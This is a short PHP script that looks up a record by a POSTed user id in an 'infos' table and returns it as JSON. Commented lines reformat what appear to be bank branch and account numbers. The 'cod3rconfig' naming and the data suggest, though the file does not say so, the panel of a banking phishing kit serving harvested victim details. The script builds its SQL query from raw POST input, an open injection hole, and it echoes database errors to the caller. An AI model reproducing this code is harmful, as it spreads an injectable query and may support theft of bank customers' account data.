<?php
require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
if($_POST['idUsuario']) {
	$id = $_POST['idUsuario'];
    $sql = "SELECT * FROM infos WHERE id='$id'";
	$resultset = mysqli_query(DBConnect(), $sql) or die("database error:". mysqli_error(DBConnect()));    
    $data = array();
    while( $rows = mysqli_fetch_assoc($resultset) ) {
        
	//	$Agencia_Formatada = str_replace("-", "", $rows['ag']);
      //  $Conta_Formatada2 = str_replace("x", "0", $rows['co']);
        //$Conta_FormatadaS = str_replace("X", "0", $Conta_Formatada2);
        //$Conta_Formatada = str_replace("-", "", $Conta_FormatadaS); 
		$data = $rows;
    }
  
   echo json_encode($data);

   $status = array(
   
   'status' => '1,2,3'
   
   
   );
   
   //DBUpDate('infos',$status , 'id="'.$id.'"');
   
} else {
    echo 0;    
}
?>